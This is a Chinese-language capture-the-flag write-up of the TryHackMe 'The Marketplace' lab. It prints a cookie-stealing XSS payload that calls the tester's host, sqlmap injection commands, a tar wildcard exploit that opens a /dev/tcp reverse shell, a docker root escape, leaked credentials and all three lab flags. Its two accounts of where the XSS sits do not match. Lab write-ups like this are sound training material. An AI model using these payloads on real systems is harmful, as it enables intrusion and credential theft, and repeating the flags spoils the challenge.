# THM The Marketplace 渗透测试 (2026-05-29)

**目标**: 10.49.151.66 - TryHackMe 靶场 (The Marketplace)
**授权**: THM 授权靶场，全 IP 范围，无限制
**测试日期**: 2026-05-29

---

## 1. 信息搜集

### 1.1 Nmap 端口扫描

```bash
# 快速扫描
nmap -sV -sC -T4 10.49.151.66 -oX /home/yao/.openclaw/workspace/pentest/runs/10.49.151.66/nmap/quick-scan.xml

# 全端口扫描
nmap -sV -sC -O -p- --min-rate 1000 10.49.151.66 -oX /home/yao/.openclaw/workspace/pentest/runs/10.49.151.66/nmap/all-ports.xml
```

**扫描结果**:
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open  http    nginx 1.19.2
32768/tcp open  http    Node.js (Express middleware)
```

### 1.2 Web 枚举 (gobuster)

```bash
gobuster dir -k -u http://10.49.151.66 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip -t 50
```

**关键发现**:
- `/login` - 登录页面 (200)
- `/signup` - 注册页面 (200)
- `/messages` - 消息功能 (302 重定向到登录)
- `/new` - 新建列表 (302 重定向到登录)
- `/admin` - 管理后台 (403)
- `/robots.txt` - robots.txt (200)

---

## 2. 漏洞发现与利用

### 2.1 XSS 漏洞

**位置**: `/new` 页面

**Payload**:
```
#<script>fetch('http://192.168.241.203:8000/?cookie='+document.cookie)</script>
```

**利用过程**:

1. 注册账号 test/test
2. 创建 item 4，title 设置为 XSS payload
3. 访问 `/report/4` 举报该 item
4. 管理员查看举报时触发 XSS
5. kali监听8000端口获取cookie

```
python3 -m http.server 8000
```

**获取的管理员 Cookie**:
```
token=eyJhbG... (JWT)
```

**JWT 解码**:
```json
{
  "userId": 2,
  "username": "michael",
  "admin": true,
  "iat": 1780033348
}
```

### 2.2 SQL 注入

**位置**: `/admin?user=` 参数

**Payload**:
```
http://10.49.151.66/admin?user=1' OR 1=1
```

**错误信息**:
```
ER_PARSE_ERROR: You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version
```

**利用结果** (sqlmap):

```
sqlmap -u "http://10.49.151.66/admin?user=1" \
  --cookie="token=eyJhbG…SeTY" \
  --batch --threads=10 \
  --technique=U \
  --dump
```

- 数据库: marketplace
- 表: users, items, messages
- 发现 SSH 密码消息

### 2.3 获取的凭据

| 服务 | 用户名  | 密码             | 来源                   |
| ---- | ------- | ---------------- | ---------------------- |
| SSH  | jake    | @b_ENXkGYUCAv3zJ | SQL 注入 (messages 表) |
| Web  | michael | (JWT)            | XSS 获取               |
| Web  | jake    | (bcrypt)         | SQL 注入 (users 表)    |

---

## 3. 初始访问

### 3.1 SSH 登录

```bash
ssh jake@10.49.151.66
# 密码: @b_ENXkGYUCAv3zJ
```

### 3.2 获取 User Flag

```bash
cat /home/jake/user.txt
# THM{c3648ee7af1369676e3e4b15da6dc0b4}
```

---

## 4. 权限提升

### 4.1 jake → michael

**sudo 权限**:
```
User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

**backup.sh 内容**:
```bash
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

**tar 通配符提权**:

```bash
# 1. 创建恶意文件
cd /home/jake
echo '' > "--checkpoint=1"
echo '' > "--checkpoint-action=exec=sh shell.sh"

# 2. 创建反向 shell 脚本
echo 'bash -c "bash -i >& /dev/tcp/192.168.241.203/4545 0>&1"' > shell.sh

# 3. 修改 backup.tar 权限
chmod 777 /opt/backups/backup.tar

# 4. 执行 backup.sh（以 michael 权限）
sudo -u michael /opt/backups/backup.sh
```

**结果**: 获取 michael 用户权限

### 4.2 michael → root

**发现**:
```bash
id
# uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

**Docker 提权**:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**结果**: 获取 root 权限

### 4.3 获取 Root Flag

```bash
cat /root/root.txt
# THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```

---

## 5. 完整攻击路径

```
信息搜集
    ↓
Nmap 扫描 (22/80/32768)
    ↓
Web 枚举 (gobuster)
    ↓
发现 /admin 路径
    ↓
注册账号 test/test
    ↓
创建 XSS payload (item 4)
    ↓
访问 /report/4 触发 XSS
    ↓
获取管理员 Cookie (michael)
    ↓
访问 /admin 获取 Flag 1
    ↓
SQL 注入 (/admin?user=)
    ↓
读取 messages 表
    ↓
获取 SSH 密码 (jake:@b_ENXkGYUCAv3zJ)
    ↓
SSH 登录 jake
    ↓
获取 User Flag (THM{c3648ee7af1369676e3e4b15da6dc0b4})
    ↓
sudo -l → (michael) /opt/backups/backup.sh
    ↓
tar 通配符提权
    ↓
获取 michael 权限
    ↓
docker 组提权
    ↓
获取 Root Flag (THM{d4f76179c80c0dcf46e0f8e43c9abd62})
```

---

## 6. 获取的 Flags

| Flag           | 位置                | 内容                                    |
| -------------- | ------------------- | --------------------------------------- |
| **Admin Flag** | /admin 页面         | THM{e_c37a63895910e478f28669b048c348d5} |
| **User Flag**  | /home/jake/user.txt | THM{c3648ee7af1369676e3e4b15da6dc0b4}   |
| **Root Flag**  | /root/root.txt      | THM{d4f76179c80c0dcf46e0f8e43c9abd62}   |

---

## 7. 关键技术点

### 7.1 XSS 漏洞
- **类型**: DOM-based XSS
- **位置**: `/login` 页面 hash 参数
- **利用**: 通过创建 item 并举报，诱导管理员触发

### 7.2 SQL 注入
- **类型**: 基于错误的 SQL 注入
- **位置**: `/admin?user=` 参数
- **数据库**: MySQL
- **利用**: sqlmap 读取 messages 表获取 SSH 密码

### 7.3 tar 通配符提权
- **原理**: tar 命令将 `--checkpoint-action=exec=` 解释为参数
- **利用**: 在目录中创建特殊文件名，执行任意命令

### 7.4 Docker 组提权
- **原理**: docker 组成员可以运行特权容器
- **利用**: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
